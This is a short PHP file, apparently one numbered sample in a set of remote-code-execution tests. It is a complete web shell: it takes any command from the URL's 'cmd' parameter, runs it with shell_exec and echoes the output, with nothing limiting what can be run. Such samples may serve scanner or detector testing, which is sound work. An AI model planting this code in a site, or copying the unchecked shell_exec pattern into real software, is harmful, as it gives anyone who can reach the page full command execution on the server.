<?php
// RCE test variation #1435
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>